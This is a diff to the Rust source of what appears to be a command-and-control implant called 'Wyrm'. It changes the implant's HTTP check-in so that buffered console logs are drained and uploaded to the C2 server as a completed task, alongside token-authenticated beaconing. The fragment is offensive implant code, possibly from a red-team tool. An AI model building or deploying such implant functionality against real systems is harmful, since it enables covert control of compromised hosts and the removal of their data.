@@ -1,8 +1,11 @@
 //! Implant communications are handled here.
 
-use std::collections::HashMap;
+use std::{collections::HashMap, mem::take};
 
-use crate::{utils::time_utils::epoch_now, wyrm::Wyrm};
+use crate::{
+    utils::{console::CONSOLE_LOG, time_utils::epoch_now},
+    wyrm::Wyrm,
+};
 use minreq::Response;
 use rand::Rng;
 use shared::{
@@ -45,6 +48,20 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Erro
     let sec_token = &implant.c2_config.security_token;
     let ua = &implant.c2_config.useragent;
     let headers = generate_generic_headers(&implant.implant_id, sec_token, ua);
+
+    // Drain the console log and put it into a completed task
+    {
+        let mut log = CONSOLE_LOG.lock().unwrap();
+        if !log.is_empty() {
+            let drained = take(&mut *log);
+            // Note task 1 will always be for console logs as we hardcode this via sql migration when the srv starts up
+            // for the first time.
+            implant.push_completed_task(
+                &Task::from(1, Command::ConsoleMessages, None),
+                Some(drained),
+            );
+        }
+    }
 
     // Make the actual request, depending upon whether we have data to upload or not
     let response = if implant.completed_tasks.is_empty() {
